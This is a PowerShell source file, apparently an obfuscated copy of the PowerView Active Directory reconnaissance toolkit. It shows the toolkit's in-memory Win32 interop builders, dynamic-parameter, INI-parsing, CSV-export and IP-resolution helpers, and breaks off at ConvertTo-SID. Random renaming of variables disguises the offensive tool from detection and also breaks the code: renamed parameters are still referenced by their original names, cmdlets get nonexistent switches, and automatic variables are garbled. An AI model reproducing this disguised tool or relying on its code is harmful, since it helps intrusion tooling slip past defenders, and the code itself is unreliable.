












function New-InMemoryModule {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UAjCZRTMswNEJi = [Guid]::NewGuid().ToString()
    )

    $qJITyRTIbBWBjXPDvqmJzv5 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($qYFR5PCZruUkdna9T, @())
    $Ve5XzdpZspxj = $qJITyRTIbBWBjXPDvqmJzv5.GetAssemblies()

    foreach ($pmBhvbNXyg5riEYqdK in $Ve5XzdpZspxj) {
        if ($pmBhvbNXyg5riEYqdK.FullName -and ($pmBhvbNXyg5riEYqdK.FullName.Split(',')[0] -eq $UAjCZRTMswNEJi)) {
            return $pmBhvbNXyg5riEYqdK
        }
    }

    $neJbUZgW3iaLk0zthRuu = New-Object Reflection.AssemblyName($UAjCZRTMswNEJi)
    $3Ecdwi8qNy = $qJITyRTIbBWBjXPDvqmJzv5
    $oqKSvn = $3Ecdwi8qNy.DefineDynamicAssembly($neJbUZgW3iaLk0zthRuu, 'Run')
    $v3AcnbWeJtaQGZRDuYE = $oqKSvn.DefineDynamicModule($UAjCZRTMswNEJi, $False)

    return $v3AcnbWeJtaQGZRDuYE
}




function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $UtHQ = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $UtHQ['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $UtHQ['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $UtHQ['Charset'] = $Charset }
    if ($SetLastError) { $UtHQ['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $UtHQ['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $UtHQ
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $vTklDQUE0wsZzFxqYKIbnLjiW = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $vTklDQUE0wsZzFxqYKIbnLjiW[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $vTklDQUE0wsZzFxqYKIbnLjiW[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$vTklDQUE0wsZzFxqYKIbnLjiW.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $vTklDQUE0wsZzFxqYKIbnLjiW[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $vTklDQUE0wsZzFxqYKIbnLjiW[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $b07KAXTqvUWxSfk = $vTklDQUE0wsZzFxqYKIbnLjiW[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            
            $RGKU3QpH = 1
            foreach($HeIvDpBf2jk in $ParameterTypes)
            {
                if ($HeIvDpBf2jk.IsByRef)
                {
                    [void] $b07KAXTqvUWxSfk.DefineParameter($RGKU3QpH, 'Out', $qYFR5PCZruUkdna9T)
                }

                $RGKU3QpH++
            }

            $DllImportPh6xeGMqlnOzLvcwX = [Runtime.InteropServices.DllImportAttribute]
            $Pqwm32iNfr = $DllImportPh6xeGMqlnOzLvcwX.GetField('SetLastError')
            $B5PK3IWiqrRpc68xoVsv = $DllImportPh6xeGMqlnOzLvcwX.GetField('CallingConvention')
            $7HYPpNd = $DllImportPh6xeGMqlnOzLvcwX.GetField('CharSet')
            $LWDyaXsEjOSAb1TzBgdM2eZ4 = $DllImportPh6xeGMqlnOzLvcwX.GetField('EntryPoint')
            if ($SetLastError) { $IEbaNcnUg = $True } else { $IEbaNcnUg = $False }

            if ($PSBoundParameters['EntryPoint']) { $2LxVbYJnzj = $EntryPoint } else { $2LxVbYJnzj = $FunctionName }

            
            $sdVKIpc2ir5mwfYM739EjClXo = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $kdBYfKqPzODzkhl1FkxZoTGX = New-Object Reflection.Emit.CustomAttributeBuilder($sdVKIpc2ir5mwfYM739EjClXo,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($Pqwm32iNfr,
                                           $B5PK3IWiqrRpc68xoVsv,
                                           $7HYPpNd,
                                           $LWDyaXsEjOSAb1TzBgdM2eZ4),
                [Object[]] @($IEbaNcnUg,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $2LxVbYJnzj))

            $b07KAXTqvUWxSfk.SetCustomAttribute($kdBYfKqPzODzkhl1FkxZoTGX)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $vTklDQUE0wsZzFxqYKIbnLjiW
        }

        $OFL = @{}

        foreach ($FcI0EDWeGRPBgi9YlykU in $vTklDQUE0wsZzFxqYKIbnLjiW.Keys)
        {
            $fK67iX = $vTklDQUE0wsZzFxqYKIbnLjiW[$FcI0EDWeGRPBgi9YlykU].CreateType()

            $OFL[$FcI0EDWeGRPBgi9YlykU] = $fK67iX
        }

        return $OFL
    }
}


function psenum {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $MCs,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $fK67iX,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $zvas,

        [Switch]
        $7E1
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($MCs))
    }

    $xiwsPe7uHOkj = $fK67iX -as [Type]

    $3PFiNrAy1f5kzjOQ6mSq8MYoI = $Module.DefineEnum($MCs, 'Public', $xiwsPe7uHOkj)

    if ($7E1)
    {
        $RQBDUtLadIqnYcfMx64OkgGuV = [FlagsAttribute].GetConstructor(@())
        $HOM = New-Object Reflection.Emit.CustomAttributeBuilder($RQBDUtLadIqnYcfMx64OkgGuV, @())
        $3PFiNrAy1f5kzjOQ6mSq8MYoI.SetCustomAttribute($HOM)
    }

    foreach ($FcI0EDWeGRPBgi9YlykU in $zvas.Keys)
    {
        
        $qYFR5PCZruUkdna9T = $3PFiNrAy1f5kzjOQ6mSq8MYoI.DefineLiteral($FcI0EDWeGRPBgi9YlykU, $zvas[$FcI0EDWeGRPBgi9YlykU] -as $xiwsPe7uHOkj)
    }

    $3PFiNrAy1f5kzjOQ6mSq8MYoI.CreateType()
}




function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $fK67iX,

        [Parameter(Position = 2)]
        [UInt16]
        $2iCxJSbEZDQFphllc9F,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $fK67iX -as [Type]
        Offset = $2iCxJSbEZDQFphllc9F
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $MCs,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $v6IL1zjfWHqn,

        [Reflection.Emit.PackingSize]
        $eFPmi9NMaX = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $N612hL
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($MCs))
    }

    [Reflection.TypeAttributes] $e6YKXKaL0JbD7GV = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($N612hL)
    {
        $e6YKXKaL0JbD7GV = $e6YKXKaL0JbD7GV -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $e6YKXKaL0JbD7GV = $e6YKXKaL0JbD7GV -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $Fh0YQDnF5zSzCiEFpkhT = $Module.DefineType($MCs, $e6YKXKaL0JbD7GV, [ValueType], $eFPmi9NMaX)
    $DvhkqLMuNGCTa4tQJ = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $si6KKj = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $68Zwtitxl7 = New-Object Hashtable[]($v6IL1zjfWHqn.Count)

    
    
    
    foreach ($RAbXalrMBIsrqjyxVA in $v6IL1zjfWHqn.Keys)
    {
        $hwT = $v6IL1zjfWHqn[$RAbXalrMBIsrqjyxVA]['Position']
        $68Zwtitxl7[$hwT] = @{FieldName = $RAbXalrMBIsrqjyxVA; Properties = $v6IL1zjfWHqn[$RAbXalrMBIsrqjyxVA]}
    }

    foreach ($RAbXalrMBIsrqjyxVA in $68Zwtitxl7)
    {
        $Ga3v = $RAbXalrMBIsrqjyxVA['FieldName']
        $lUAL5QBudG9gZ7etW8zYyI = $RAbXalrMBIsrqjyxVA['Properties']

        $2iCxJSbEZDQFphllc9F = $lUAL5QBudG9gZ7etW8zYyI['Offset']
        $fK67iX = $lUAL5QBudG9gZ7etW8zYyI['Type']
        $MarshalAs = $lUAL5QBudG9gZ7etW8zYyI['MarshalAs']

        $7LRu = $Fh0YQDnF5zSzCiEFpkhT.DefineField($Ga3v, $fK67iX, 'Public')

        if ($MarshalAs)
        {
            $FrnfuSeyiEHsg0B4 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $21o = $MarshalAs[1]
                $SWDAZBX3UVcxYPJu = New-Object Reflection.Emit.CustomAttributeBuilder($DvhkqLMuNGCTa4tQJ,
                    $FrnfuSeyiEHsg0B4, $si6KKj, @($21o))
            }
            else
            {
                $SWDAZBX3UVcxYPJu = New-Object Reflection.Emit.CustomAttributeBuilder($DvhkqLMuNGCTa4tQJ, [Object[]] @($FrnfuSeyiEHsg0B4))
            }

            $7LRu.SetCustomAttribute($SWDAZBX3UVcxYPJu)
        }

        if ($N612hL) { $7LRu.SetOffset($2iCxJSbEZDQFphllc9F) }
    }

    
    
    $qHeese9UYzGlWAteBb = $Fh0YQDnF5zSzCiEFpkhT.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $eouSCzPdp4VL = $qHeese9UYzGlWAteBb.GetILGenerator()
    
    $eouSCzPdp4VL.Emit([Reflection.Emit.OpCodes]::Ldtoken, $Fh0YQDnF5zSzCiEFpkhT)
    $eouSCzPdp4VL.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $eouSCzPdp4VL.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $eouSCzPdp4VL.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $AG46yyGHqExjCsO8kU = $Fh0YQDnF5zSzCiEFpkhT.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $Fh0YQDnF5zSzCiEFpkhT,
        [Type[]] @([IntPtr]))
    $MdS = $AG46yyGHqExjCsO8kU.GetILGenerator()
    $MdS.Emit([Reflection.Emit.OpCodes]::Nop)
    $MdS.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $MdS.Emit([Reflection.Emit.OpCodes]::Ldtoken, $Fh0YQDnF5zSzCiEFpkhT)
    $MdS.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $MdS.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $MdS.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $Fh0YQDnF5zSzCiEFpkhT)
    $MdS.Emit([Reflection.Emit.OpCodes]::Ret)

    $Fh0YQDnF5zSzCiEFpkhT.CreateType()
}








Function New-DynamicParameter {


    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$TwsV1,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$fK67iX = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$32MgN,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$MandatoryXsVr6lYstdcIvkZFfnWYmvdp,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$Avo7u5gwE,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$PJ9LKO8ZTPJ,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AnNm7sbvlI,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DUt4E5eoY1Z7Hjql9,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$mztFeaxU9wy6L3fo74rk,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$XRqHdAxKD6TvcCsg5jrPt = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$G2TzFU6yg22t,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$cZ45VIwYPlELrFJGQ6pmBqX,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$5W8GbbU2MeYx,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$EO8xLguC69ceKylR0U,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$fMkpqP6ymdSacbsiFUTnY8OIW,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ySYTGDEQzWw6q1Iv7,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$O5ik1gCnFhIdDP4H9UfpV,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$xxpVAuaYr7dhTy30ZcATOo5,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$IVbp30T3VhssRcNoGhC,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$uHe2d8HK2vn,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$g4C3L1BXaM,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $V7qfCFdaGEUwx4c = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$lr2B2ibhO,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $3WfT0i9uQKic
    )

    Begin {
        $YW0qFuXo4VE1tRTIvsDpZUw2 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $K = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($lr2B2ibhO) {
            $Ysabbp4jXgsPhJmYG = $3WfT0i9uQKic.Keys | Where-Object { $K -notcontains $_ }
            ForEach($HeIvDpBf2jk in $Ysabbp4jXgsPhJmYG) {
                if ($HeIvDpBf2jk) {
                    Set-Variable -TwsV1 $HeIvDpBf2jk -BqU $3WfT0i9uQKic.$HeIvDpBf2jk -Scope 1 -Force
                }
            }
        }
        else {
            $gBILhjsr2DX9VqGCJmb3FflS = @()
            $gBILhjsr2DX9VqGCJmb3FflS = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                
                                if(!$_.Value.Equals((Get-Variable -TwsV1 $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                
                                if($_.Value -ne (Get-Variable -TwsV1 $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($gBILhjsr2DX9VqGCJmb3FflS) {
                $gBILhjsr2DX9VqGCJmb3FflS | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            
            $gylE6FJ = (Get-Command -TwsV1 ($2Pc3tSl3HYh.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $2Pc3tSl3HYh.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            
            $6ui73UrgzN2aKIWypPvm5 = $qYFR5PCZruUkdna9T
            ForEach ($HeIvDpBf2jk in $gylE6FJ) {
                $sPx9aCigP2140K4mobF = Get-Variable -TwsV1 $HeIvDpBf2jk -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($HeIvDpBf2jk, [ref]$6ui73UrgzN2aKIWypPvm5) -and $sPx9aCigP2140K4mobF) {
                    $PSBoundParameters.$HeIvDpBf2jk = $sPx9aCigP2140K4mobF
                }
            }

            if($V7qfCFdaGEUwx4c) {
                $k4FXlEBDwXVVKM0a = $V7qfCFdaGEUwx4c
            }
            else {
                $k4FXlEBDwXVVKM0a = $YW0qFuXo4VE1tRTIvsDpZUw2
            }

            
            $QxAV = {Get-Variable -TwsV1 $_ -ValueOnly -Scope 0}

            
            $hZTXUl = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $K97aT2yl = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $sTLSm3 = '^Alias$'
            $EIzLjWgTAfitBQJKXxG8Zu = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $hZTXUl {
                    Try {
                        $EIzLjWgTAfitBQJKXxG8Zu.$_ = . $QxAV
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($k4FXlEBDwXVVKM0a.Keys -contains $TwsV1) {
                $k4FXlEBDwXVVKM0a.$TwsV1.Attributes.Add($EIzLjWgTAfitBQJKXxG8Zu)
            }
            else {
                $jhu3dR2FCs1AqO8JXT9BnPlcg = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $K97aT2yl {
                        Try {
                            $VfXpM = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $QxAV) -ErrorAction Stop
                            $jhu3dR2FCs1AqO8JXT9BnPlcg.Add($VfXpM)
                        }
                        Catch { $_ }
                        continue
                    }
                    $sTLSm3 {
                        Try {
                            $WIGCUzvnMs = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $QxAV) -ErrorAction Stop
                            $jhu3dR2FCs1AqO8JXT9BnPlcg.Add($WIGCUzvnMs)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $jhu3dR2FCs1AqO8JXT9BnPlcg.Add($EIzLjWgTAfitBQJKXxG8Zu)
                $HeIvDpBf2jk = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($TwsV1, $fK67iX, $jhu3dR2FCs1AqO8JXT9BnPlcg)
                $k4FXlEBDwXVVKM0a.Add($TwsV1, $HeIvDpBf2jk)
            }
        }
    }

    End {
        if(!$lr2B2ibhO -and !$V7qfCFdaGEUwx4c) {
            $k4FXlEBDwXVVKM0a
        }
    }
}


function Get-IniContent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $a9LvymtQdGPNr8cqgsI,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Nb4fuJEvKYU1GcgpTP
    )

    BEGIN {
        $vF = @{}
    }

    PROCESS {
        ForEach ($XhfGVE in $a9LvymtQdGPNr8cqgsI) {
            if (($XhfGVE -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $7GPfL6B = (New-Object System.Uri($XhfGVE)).Host
                if (-not $vF[$7GPfL6B]) {
                    
                    Add-RemoteConnection -mA $7GPfL6B -3ezVSfm6f4k $3ezVSfm6f4k
                    $vF[$7GPfL6B] = $True
                }
            }

            if (Test-a9LvymtQdGPNr8cqgsI -a9LvymtQdGPNr8cqgsI $XhfGVE) {
                if ($PSBoundParameters['OutputObject']) {
                    $Nu1JNsEIsSO36RmV6Yu = New-Object PSObject
                }
                else {
                    $Nu1JNsEIsSO36RmV6Yu = @{}
                }
                Switch -Regex -File $XhfGVE {
                    "^\[(.+)\]" 
                    {
                        $yM = $CGto8ucDihpC[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $yM = $yM.Replace(' ', '')
                            $X0FxMjG = New-Object PSObject
                            $Nu1JNsEIsSO36RmV6Yu | Add-Member Noteproperty $yM $X0FxMjG
                        }
                        else {
                            $Nu1JNsEIsSO36RmV6Yu[$yM] = @{}
                        }
                        $k80vCsl7mb = 0
                    }
                    "^(;.*)$" 
                    {
                        $BqU = $CGto8ucDihpC[1].Trim()
                        $k80vCsl7mb = $k80vCsl7mb + 1
                        $TwsV1 = 'Comment' + $k80vCsl7mb
                        if ($PSBoundParameters['OutputObject']) {
                            $TwsV1 = $TwsV1.Replace(' ', '')
                            $Nu1JNsEIsSO36RmV6Yu.$yM | Add-Member Noteproperty $TwsV1 $BqU
                        }
                        else {
                            $Nu1JNsEIsSO36RmV6Yu[$yM][$TwsV1] = $BqU
                        }
                    }
                    "(.+?)\s*=(.*)" 
                    {
                        $TwsV1, $BqU = $CGto8ucDihpC[1..2]
                        $TwsV1 = $TwsV1.Trim()
                        $8RC1NuJnZiyJ = $BqU.split(',') | ForEach-Object { $_.Trim() }

                        

                        if ($PSBoundParameters['OutputObject']) {
                            $TwsV1 = $TwsV1.Replace(' ', '')
                            $Nu1JNsEIsSO36RmV6Yu.$yM | Add-Member Noteproperty $TwsV1 $8RC1NuJnZiyJ
                        }
                        else {
                            $Nu1JNsEIsSO36RmV6Yu[$yM][$TwsV1] = $8RC1NuJnZiyJ
                        }
                    }
                }
                $Nu1JNsEIsSO36RmV6Yu
            }
        }
    }

    END {
        
        $vF.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $h92XtEowmqi,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $a9LvymtQdGPNr8cqgsI,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $QKqkYp = ',',

        [Switch]
        $J8dOtvDTbu1H
    )

    BEGIN {
        $LcxQoDPGK = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $DMWw7FIDGV5tbHOSGut11Ws = [System.IO.File]::Exists($LcxQoDPGK)

        
        $noF = New-Object System.Threading.Mutex $False,'CSVMutex'
        $qYFR5PCZruUkdna9T = $noF.WaitOne()

        if ($PSBoundParameters['Append']) {
            $Rzu1zXLInCUu5wo7vZzzaAyi = [System.IO.FileMode]::Append
        }
        else {
            $Rzu1zXLInCUu5wo7vZzzaAyi = [System.IO.FileMode]::Create
            $DMWw7FIDGV5tbHOSGut11Ws = $False
        }

        $CSVStreambSL1HnY2Jzlse = New-Object IO.FileStream($LcxQoDPGK, $Rzu1zXLInCUu5wo7vZzzaAyi, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $izxWCk = New-Object System.IO.StreamWriter($CSVStreambSL1HnY2Jzlse)
        $izxWCk.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Fd60Lwl1DIQcXhYvr in $h92XtEowmqi) {
            $R5iKbAIaWC3woO = ConvertTo-Csv -h92XtEowmqi $Fd60Lwl1DIQcXhYvr -QKqkYp $QKqkYp -NoTypeInformation

            if (-not $DMWw7FIDGV5tbHOSGut11Ws) {
                
                $R5iKbAIaWC3woO | ForEach-Object { $izxWCk.WriteLine($_) }
                $DMWw7FIDGV5tbHOSGut11Ws = $True
            }
            else {
                
                $R5iKbAIaWC3woO[1..($R5iKbAIaWC3woO.Length-1)] | ForEach-Object { $izxWCk.WriteLine($_) }
            }
        }
    }

    END {
        $noF.ReleaseMutex()
        $izxWCk.Dispose()
        $CSVStreambSL1HnY2Jzlse.Dispose()
    }
}


function Resolve-IPAddress {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $mA = $8MSydlAwkKhVgnu4Ls10:COMPUTERNAME
    )

    PROCESS {
        ForEach ($TfIJKo1L in $mA) {
            try {
                @(([Net.Dns]::GetHostEntry($TfIJKo1L)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $TxOjsKu13lUSJ8MHybpYNF = New-Object PSObject
                        $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'ComputerName' $TfIJKo1L
                        $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $TxOjsKu13lUSJ8MHybpYNF
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $TfIJKo1L to an IP Address."
            }
        }
    }
}


function ConvertTo-SID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
